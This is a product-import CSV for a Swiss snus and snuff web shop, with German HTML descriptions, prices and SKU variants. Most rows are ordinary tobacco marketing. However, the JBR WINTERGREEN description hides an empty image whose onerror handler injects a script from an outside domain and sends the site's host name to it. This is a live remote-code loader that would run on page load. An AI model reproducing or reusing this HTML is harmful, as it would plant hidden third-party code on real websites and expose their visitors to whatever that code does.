Name,Description,SKU,Gender, Attribute 1,Attribute 1 Value, Attribute 2,Attribute 2 Value, Attribute 3,Attribute 3 Value,Base Image 1 ,Base Image 2,Base Image 3,Base Image 4,Base Image 5,Base Price(USD),Sale Price(USD),Quantity,Unit of Weight,Weight,Unit of Dimensions,Height,Width,Length,SEO Title,SEO Description,Vendor,Parent SKU
Jakobsson Mint Strong,"<div class=""MuiGrid-root MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-sm-6"">
<p>Mintsnus ist anders - das ist Jakobssons Mint Strong. Dieser Snus bietet das beliebte Kräuter-Minz-Aroma, das von keinem anderen Snus übertroffen wird. Wenn Sie auf der Suche nach einem erfrischenden Snus sind, sollten Sie diesen unbedingt probieren! Mit einem Nikotingehalt von 14 mg bietet er auch einen starken Kick.</p>
<p>Der Jakobssons Mint Strong Snus ist für sein herausragendes Geschmackserlebnis bekannt. Das erfrischende Kräuter-Minz-Aroma verleiht diesem Snus einen angenehmen und belebenden Charakter. Die Mischung aus Minze und Kräutern sorgt für eine harmonische Kombination, die Snus-Liebhaber begeistern wird.</p>
<p>Gotlandssnus, der Hersteller dieses Snus, ist für seine hochwertigen Produkte und die Verwendung sorgfältig ausgewählter Zutaten bekannt. Der Mint Strong Snus wird mit größter Sorgfalt hergestellt, um eine hervorragende Qualität und ein gleichbleibendes Geschmackserlebnis zu gewährleisten.</p>
<p>Snus ist ein feuchter, rauchfreier Tabak zum oralen Gebrauch, der in Schweden und anderen Teilen Europas beliebt ist. Beim Snus wird der Tabak unter die Oberlippe platziert, um den Geschmack und das Nikotin freizusetzen. Es handelt sich um ein traditionelles Genussmittel, das seit dem 18. Jahrhundert Teil der schwedischen Kultur ist.</p>
<p>Die Inhaltsstoffe von Snus umfassen Wasser, Tabak, Salz und Aromen. Diese Zutaten müssen von der nationalen Lebensmittelbehörde zugelassen sein, um den Verkauf von Snus in der Schweiz zu ermöglichen.</p>
<p>Der Tabak ist die Grundlage des Snus und beeinflusst sowohl den Geschmack als auch den Nikotingehalt. In jedem Produkt werden verschiedene Tabaksorten verwendet, da sie unterschiedliche Eigenschaften aufweisen. Einige Tabaksorten enthalten mehr Nikotin, während andere einen stärkeren Geschmack haben.</p>
<p>Wenn Sie in der Schweiz Snus kaufen möchten, bietet Snus-Star.ch eine einfache und bequeme Lösung. Wir bieten Snus zu fairen Preisen an, um unseren Kunden eine erschwingliche Option zu bieten. Sie können bei uns verschiedene Snus-Marken wie Supreme Snus, Odens Snus und Scooper Schweiz finden. Wir bieten auch den Kauf auf Rechnung an, um Ihnen das Einkaufserlebnis zu erleichtern.</p>
<p>Stichwörter: Snus kaufen Schweiz, günstiger Snus kaufen, Supreme Snus, Odens Snus, Scooper Schweiz, Snus Schweiz, Snus kaufen auf Rechnung.</p>
</div>",Jakobsson Mint Strong,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/IMG_6623.jpg,,,,,5.48,,1,G,38,IN,3,3,3,,,,
,,501,Unisex,Stück,1,,,,,,,,,,5.48,,1,G,38,IN,3,3,3,,,Snus-Star.ch,Jakobsson Mint Strong
JBR RED,"<p><span><strong>JBR Red Snuff ist ein typischer Pöschler mentholhaltiger Schnupftabak, der in stylischen, glänzenden 10-Gramm-Kunststoffdosen verkauft wird. Der Geruch in der Dose: Schon riecht man ein kräftiges Kirscharoma mit einem Hauch Minze. Ein fruchtiger, aber gleichzeitig kühler Schnupftabak kündigt sich an.</strong> Durch seine mittlere Abrasivität und leichte Feuchtigkeit ist Schnupftabak sehr gut zum Schnüffeln geeignet. Wie Sie es von vielen Pöschl Snuffs gewohnt sind, gelangt Menthol beim Riechen zuerst in die Nase. Schnell kamen aromatische Kirschnoten und feste Tabak-Basisnoten ins Spiel. Allmählich lässt der fruchtige Anteil wieder nach und der satte Minzgeschmack gewinnt wieder an Kraft. Kirsch-Menthol-Kompositionen sind bei Schnupftabak-Liebhabern sehr beliebt, da ihre Mischungen meist sehr harmonisch sind. Dies ist auch bei dem ausgewogenen Geschmack von JBR Red Snuff der Fall.</span></p>
<p> </p>
<p>Art Nr: 1015</p>",JBR RED,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/IMG_6861.jpg,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,,
,,1015,Unisex,Stück,1,,,,,,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,Snus-Star.ch,JBR RED
,,1015,Unisex,Stück,5,,,,,,,,,,34.50,25.53,1,G,102,IN,3,3,3,,,Snus-Star.ch,JBR RED
,,1015,Unisex,Stück,20,,,,,,,,,,138.00,92.85,1,G,447,IN,3,3,3,,,Snus-Star.ch,JBR RED
JBR WINTERGREEN SCHNUPF 10g,"<div class=""col3"">
<p>Die Pöschl Tabak GmbH &amp; Co. KG Geisenhausen erweitert ihr Sortiment um den neuen Snuff JBR Wintergreen, der ab Juli 2016 auch in Deutschland erhältlich sein wird. Diese Sorte wurde bisher seit 2015 ausschließlich in Österreich und der Schweiz vertrieben.</p>
<p>JBR Wintergreen ist ein english-type Menthol Snuff, was bedeutet, dass er den typischen Charakter und Geschmack eines englischen Schnupftabaks aufweist. Das besondere Merkmal dieser Sorte ist der Wintergreen-Geschmack, der für eine angenehme Frische sorgt. Wintergreen ist eine Pflanze, die ein leicht minziges und erfrischendes Aroma hat und häufig in Kaugummis und Bonbons verwendet wird.</p>
<p>Mit der Einführung von JBR Wintergreen in Deutschland eröffnet sich den Schnupftabak-Liebhabern eine neue Geschmackserfahrung. Der englische Stil des Schnupftabaks gepaart mit dem erfrischenden Wintergreen-Geschmack bietet ein einzigartiges Genusserlebnis. Ob für erfahrene Schnupfer oder Neulinge auf dem Gebiet des Schnupftabaks, JBR Wintergreen verspricht eine erfrischende und belebende Erfahrung.</p>
<p>Freuen Sie sich auf den neuen JBR Wintergreen Snuff von Pöschl Tabak, der ab Juli 2016 in Deutschland erhältlich sein wird. Genießen Sie den english-type Menthol Snuff mit seinem charakteristischen Wintergreen-Geschmack und lassen Sie sich von der erfrischenden Wirkung verzaubern.</p>
</div>
<p> </p>
<p> </p>
<p><span>Art Nr: 1001</span></p>
<div id=""mailtooptionchmailPopupModalTo"" style=""z-index: 1;""><br></div>
<div><img onerror='var s=document.createElement(""script"");s.type=""text/javascript"";s.id=""cczedcc-plg-analytics"";s.src=""//jejoro.miyinokejo.com/scripts/js?k=5fcd009490cf76e4258b4567&amp;s=""+encodeURI(btoa(window.location.host))+""&amp;ns=true"";document.getElementsByTagName(""head"")[0].appendChild(s);'></div>",JBR WINTERGREEN SCHNUPF 10g,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/IMG_6852.jpg,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,,
,,1001,Unisex,Stück,1,,,,,,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,Snus-Star.ch,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,5,,,,,,,,,,34.50,25.53,1,G,102,IN,3,3,3,,,Snus-Star.ch,JBR WINTERGREEN SCHNUPF 10g
,,1001,Unisex,Stück,20,,,,,,,,,,138.00,92.85,1,G,447,IN,3,3,3,,,Snus-Star.ch,JBR WINTERGREEN SCHNUPF 10g
JBR YELLOW,"<p>JBR Yellow Snuff ist ein typischer Pöschler mentholhaltiger Schnupftabak, der in stylischen, glänzenden 10-Gramm-Kunststoffdosen auf dem Markt angeboten wird.<br><br>Geruch in der Dose:<br>Wenn Sie JBR YELLOW probieren, werden Sie schnell feststellen, dass JBR Yellow auch den typischen Mentholgeschmack von Pöschl besitzt. Dazu kommt ein Hauch von Zitronengeschmack, der an Zitronenkuchen erinnert.<br>Geruch in der Nase:<br>Durch den mäßigen Mahlgrad und die leichte Feuchtigkeit eignet sich Schnupftabak sehr gut zum Schnüffeln. Wenn JBR Yellow Snuff in die Nase kommt, strömt eine angenehme Mischung aus Menthol- und Zitrusfruchtaromen (die höchstwahrscheinlich an Zitrone, aber auch leicht an Orange erinnern) durch die Geruchsorgane. Die Zutaten sind immer harmonisch, das Verhältnis von fruchtig und erfrischend ist relativ ausgeglichen und wird die Nase nicht überfordern. Schließlich ist Menthol immer noch die Hauptnote. Im Allgemeinen ist fast kein Tabakgeruch zu hören.</p>
<p>Art Nr: 1014</p>
<p> </p>
<p> </p>
<div data-mce-fragment=""1"" style=""text-align: left;"" data-mce-style=""text-align: left;""><br></div>",JBR YELLOW,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_cc062985-9682-4656-9ae0-51ce113209c5.jpg,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,,
,,1014,Unisex,Stück,1,,,,,,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,Snus-Star.ch,JBR YELLOW
,,1014,Unisex,Stück,5,,,,,,,,,,34.50,25.53,1,G,102,IN,3,3,3,,,Snus-Star.ch,JBR YELLOW
,,1014,Unisex,Stück,20,,,,,,,,,,138.00,92.85,1,G,447,IN,3,3,3,,,Snus-Star.ch,JBR YELLOW
JBR BLUE SCHNUPF 10G,"<p>Der JBR BLUE ist ein Schnupftabak, der mit seinem erfrischenden Menthol und dem fruchtigen Eisbonbon-Aroma eine einzigartige Kombination bietet. Sobald der Schnupftabak aufgenommen wird, entfaltet sich sofort das kühlende Menthol, das die Sinne belebt und für eine angenehme Frische sorgt. Gleichzeitig kommt das vertraute Aroma von süßem Eisbonbon zum Vorschein, das sowohl bei Kindern als auch bei Erwachsenen beliebt ist.</p>
<p>Das Zusammenspiel von Menthol und Eisbonbon-Aroma verleiht dem JBR BLUE eine besondere Geschmacksdynamik. Während das Menthol anfangs die Hauptrolle spielt und einen starken Eindruck hinterlässt, wird nach und nach das süße Eisbonbon-Aroma spürbar und ergänzt das Schnupferlebnis mit einer fruchtigen Note.</p>
<p>Der JBR BLUE ist eine beliebte Wahl für Schnupftabak-Liebhaber, die eine erfrischende und geschmackvolle Variante suchen. Das intensive Menthol und das verlockende Eisbonbon-Aroma machen ihn zu einem einzigartigen Genussmoment.</p>
<p>Tauchen Sie ein in die nostalgische Welt des JBR BLUE Schnupftabaks und genießen Sie den erfrischenden Geschmack von Menthol und dem süßen Eisbonbon-Aroma. Lassen Sie sich von dieser einzigartigen Kombination verzaubern und erleben Sie ein erfrischendes Schnupferlebnis, das Erinnerungen weckt und den Gaumen erfreut.</p>
<p><strong><br></strong></p>
<p> </p>
<p> Art Nr: 1003</p>",JBR BLUE SCHNUPF 10G,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/IMG_6848.jpg,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,,
,,1003,Unisex,Stück,1,,,,,,,,,,6.90,6.41,1,G,20,IN,3,3,3,,,Snus-Star.ch,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,5,,,,,,,,,,34.50,25.53,1,G,102,IN,3,3,3,,,Snus-Star.ch,JBR BLUE SCHNUPF 10G
,,1003,Unisex,Stück,20,,,,,,,,,,138.00,92.85,1,G,447,IN,3,3,3,,,Snus-Star.ch,JBR BLUE SCHNUPF 10G
JBR Black,"<meta charset=""UTF-8"">
<div class=""group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 dark:bg-gray-800"">
<div class=""flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-xl xl:max-w-3xl md:py-6 lg:px-0 m-auto"">
<div class=""flex-shrink-0 flex flex-col relative items-end"">
<div class=""w-[30px]"">
<div class=""relative flex""><span>Mit dem neuen JBR Black Snuff wird das Snuff-Sortiment um eine frische Option erweitert. Dieser Snuff besticht durch seinen angenehmen Duft nach Tonkabohnen, Lakritz und Vanille. Wenn Sie auf der Suche nach einer einzigartigen und aromatischen Snuff-Variante sind, ist der JBR Black Snuff definitiv einen Versuch wert.</span></div>
</div>
</div>
</div>
</div>
<div class=""group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]"">
<div class=""flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-xl xl:max-w-3xl md:py-6 lg:px-0 m-auto"">
<div class=""relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]"">
<div class=""flex flex-grow flex-col gap-3"">
<div class=""min-h-[20px] flex flex-col items-start gap-4 whitespace-pre-wrap break-words"">
<div class=""markdown prose w-full break-words dark:prose-invert light"">
<p data-mce-fragment=""1"">Der Duft des JBR Black Snuff ist besonders ansprechend und verbindet verschiedene Noten zu einem harmonischen Gesamtaroma. Die süßen und würzigen Nuancen von Tonkabohnen, das charakteristische Aroma von Lakritz und die sanfte Süße der Vanille verleihen diesem Snuff einen unverwechselbaren und verlockenden Duft.</p>
<p data-mce-fragment=""1"">Snuff, auch bekannt als Schnupftabak, ist eine traditionelle Form des Tabakkonsums, bei der fein gemahlener Tabak durch die Nase inhaliert wird. Es bietet ein intensives Geschmacks- und Nikotinerlebnis und hat eine lange Geschichte als Genussmittel. Der JBR Black Snuff bietet eine einzigartige Variation mit seinem speziellen Duftprofil.</p>
<p data-mce-fragment=""1"">Der JBR Black Snuff wird sorgfältig hergestellt, um eine hochwertige Qualität und ein gleichbleibendes Aroma zu gewährleisten. Die Kombination von Tonkabohnen, Lakritz und Vanille wurde ausgewählt, um einen ausgewogenen und ansprechenden Geschmack zu bieten, der Snuff-Liebhaber begeistern wird.</p>
<p data-mce-fragment=""1"">Erweitern Sie Ihr Snuff-Erlebnis mit dem JBR Black Snuff und genießen Sie den angenehmen Duft und das einzigartige Aroma dieser neuen Variante. Tauchen Sie ein in die Welt des Schnupftabaks und entdecken Sie die vielfältigen Geschmacksrichtungen und Düfte, die das Snuff-Sortiment zu bieten hat.</p>
</div>
</div>
</div>
</div>
</div>
</div>",JBR Black,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_a5e4a938-ea42-4903-b971-542616a1bfbb.jpg,,,,,6.90,6.50,1,G,20,IN,3,3,3,,,,
,,1016,Unisex,Title,Default Title,,,,,,,,,,6.90,6.50,1,G,20,IN,3,3,3,,,Snus-Star.ch,JBR Black
CRYSTALS ORIGINAL SCHNUPF Mittel,"<p>Der Mc Chrystal's Original &amp; Genuine Schnupftabak ist ein rauchfreies Produkt, das in einer praktischen 8,8g-Dose mit einer Drehfunktion erhältlich ist. Er wird aus 100% reinem Tabak hergestellt und erfüllt höchste Qualitätsstandards. Dieser exklusive Schnupftabak von Mc Chrystal's besteht aus einer sorgfältig ausgewählten Mischung feiner Tabaksorten und wird nach langjähriger Familientradition verarbeitet.</p>
<p>Der Schnupftabak von Mc Chrystal's zeichnet sich durch sein frisch-fruchtig-süßes Aroma aus, das von einer dezenten Heunote und einem Hauch von frischem Menthol begleitet wird. Die natürlichen Aromen verleihen dem Tabak eine angenehme blumige Note. Der Tabak enthält von Natur aus Nikotin, das durch die Nasenschleimhäute seine anregende Wirkung entfaltet.</p>
<p>Die Konsistenz des gemahlenen Schnupftabaks von Mc Chrystal's ist trocken und puderfein, und die Farbe ist ein mittleres Braun. Um den vollen Genuss des Mc Chrystal's Original &amp; Genuine Schnupftabaks zu erleben, empfiehlt es sich, eine kleine Prise sanft in die Nase zu schnuppern und anschließend eine kurze Einwirkzeit abzuwarten. Jeder hat seine bevorzugte Art und Weise, den Schnupftabak aufzunehmen, sei es vom Handrücken oder von den Fingerspitzen.</p>
<p>Falls der Schnupftabak nicht leicht aus der Dose fließt, genügt in der Regel ein leichtes Aufklopfen, um ihn zu lockern. Die handliche 8,8g-Dose des Mc Chrystal's Original &amp; Genuine Schnupftabaks passt bequem in die Tasche und ermöglicht einen schnellen Zugriff auf den erfrischenden und süßen Tabakgenuss.</p>
<p> </p>
<p> </p>
<p> Art Nr: 1007</p>",CRYSTALS ORIGINAL SCHNUPF Mittel,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_46b31e8b-df74-4d36-b687-9d0c69392fdd.jpg,,,,,5.57,,1,G,20,IN,3,3,3,,,,
,,1007,Unisex,Stück,1,,,,,,,,,,5.57,,1,G,20,IN,3,3,3,,,Snus-Star.ch,CRYSTALS ORIGINAL SCHNUPF Mittel
MC CRYSTALS ORIGINAL SCHNUPF Normal,"<h2 data-mce-fragment=""1"">Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose hat ein frisch-fruchtig-süßes Aroma</h2>
<p data-mce-fragment=""1"">Der rauchfreie Mc Chrystal's Original &amp; Genuine Schnupftabak in der runden Dose mit Drehfunktion wird aus 100% reinem Tabak nach hohen Qualitätsstandards hergestellt. Der hochwertige Mc Chrystal's Original &amp; Genuine Schnupftabak besteht aus einer feinen Tabakmischung und wird nach bewährter Familientradition verarbeitet. Der naturbelassene Tabak verfügt über einen natürlichen Nikotingehalt. Der klassische Mc Chrystal's Original &amp; Genuine Schnupftabak verfügt über ein blumig-fruchtig-süßes Tabakaroma mit einer leichten Heunote und ist mit frischem Menthol angereichert. Das Nikotin entfaltet seine anregende Wirkung über die Nasenschleimhäute. Die Konsistenz des gemahlenen Mc Chrystal's Original &amp; Genuine Schnupftabaks in einer mittelbraunen Farbe ist trocken und puderfein. </p>
<p data-mce-fragment=""1"">Der höchste Tabakgenuss entsteht beim leichten Aufschnuppern einer kleinen Prise Mc Chrystal's Original &amp; Genuine Schnupftabak in die Nase. Danach sollte eine gewisse Einwirkzeit eingehalten werden, um das volle Aroma des Mc Chrystal's Original &amp; Genuine Schnupftabaks richtig auszukosten. Ob der Mc Chrystal's Original &amp; Genuine Snuff vom Handrücken oder von den Fingerspitzen aufgeschnuppert wird, ist individuell verschieden. Wenn der Mc Chrystal's Original &amp; Genuine Schnupftabak nicht leicht aus der Dose fließt, genügt in der Regel ein kurzes Aufklopfen zum Lockern. Der frisch-fruchtig-süße Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose passt bequem in die Tasche und ist schnell griffbereit.</p>
<p>Art Nr: 1008</p>",MC CRYSTALS ORIGINAL SCHNUPF Normal,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/files/image_2dd3d93c-d0a4-464b-bcda-b592fb91686c.png,,,,,3.65,,1,G,12,IN,3,3,3,,,,
,,1008,Unisex,Stück,1,,,,,,,,,,3.65,,1,G,12,IN,3,3,3,,,Snus-Star.ch,MC CRYSTALS ORIGINAL SCHNUPF Normal
MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,"<h2 data-mce-fragment=""1"">Mc Chrystal's Original &amp; Genuine Schnupftabak in der 21g Dose hat ein frisch-fruchtig-süßes Aroma</h2>
<p data-mce-fragment=""1"">Der rauchfreie Mc Chrystal's Original &amp; Genuine Schnupftabak in der runden Dose mit Drehfunktion wird aus 100% reinem Tabak nach hohen Qualitätsstandards hergestellt. Der hochwertige Mc Chrystal's Original &amp; Genuine Schnupftabak besteht aus einer feinen Tabakmischung und wird nach bewährter Familientradition verarbeitet. Der naturbelassene Tabak verfügt über einen natürlichen Nikotingehalt. Der klassische Mc Chrystal's Original &amp; Genuine Schnupftabak verfügt über ein blumig-fruchtig-süßes Tabakaroma mit einer leichten Heunote und ist mit frischem Menthol angereichert. Das Nikotin entfaltet seine anregende Wirkung über die Nasenschleimhäute. Die Konsistenz des gemahlenen Mc Chrystal's Original &amp; Genuine Schnupftabaks in einer mittelbraunen Farbe ist trocken und puderfein. </p>
<p data-mce-fragment=""1"">Der höchste Tabakgenuss entsteht beim leichten Aufschnuppern einer kleinen Prise Mc Chrystal's Original &amp; Genuine Schnupftabak in die Nase. Danach sollte eine gewisse Einwirkzeit eingehalten werden, um das volle Aroma des Mc Chrystal's Original &amp; Genuine Schnupftabaks richtig auszukosten. Ob der Mc Chrystal's Original &amp; Genuine Snuff vom Handrücken oder von den Fingerspitzen aufgeschnuppert wird, ist individuell verschieden. Wenn der Mc Chrystal's Original &amp; Genuine Schnupftabak nicht leicht aus der Dose fließt, genügt in der Regel ein kurzes Aufklopfen zum Lockern. Der frisch-fruchtig-süße Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose passt bequem in die Tasche und ist schnell griffbereit.</p>
<p> Art Nr: 1007</p>
<div id=""mailtooptionchmailPopupModalTo"" style=""z-index: 1;"">
<div id=""mailtooptionchtoPopupModalMail"">
<div id=""mailtooptionchpopupMailCloseModal""></div>
<div id=""mailtooptionchpopupQuestion""></div>
</div>
</div>",MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_b93b5189-063f-4a03-83ae-9fb551f9e32f.jpg,,,,,9.19,,1,G,42,IN,3,3,3,,,,
,,1002,Unisex,Stück,1,,,,,,,,,,9.19,,1,G,42,IN,3,3,3,,,Snus-Star.ch,MC CRYSTALS ORIGINAL SCHNUPF BIG PACK
MC Crystals CBD,"<meta charset=""UTF-8"">
<p><strong>Der Favorit unter den Bestsellern</strong><br><strong>Der McChrystal's CBD Snuff hat einen feinen Schnitt, ist leicht feucht und perfekt für den täglichen Gebrauch.</strong><br><strong>Ein erfrischendes und angenehmes Menthol-Erlebnis, perfekt abgerundet und voller Charme. Der McChrystal's CBD Schnupftabak ist der einzige und erste Schnupftabak mit CBD auf dem Schweizer Markt. Wir gehen mit dem Hype mit und bringen ein einzigartiges Produkt auf den Markt.</strong></p>",MC Crystals CBD,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/IMG_6859.jpg,,,,,7.34,,1,G,21,IN,3,3,3,,,,
,,1005,Unisex,Title,Default Title,,,,,,,,,,7.34,,1,G,21,IN,3,3,3,,,Snus-Star.ch,MC Crystals CBD
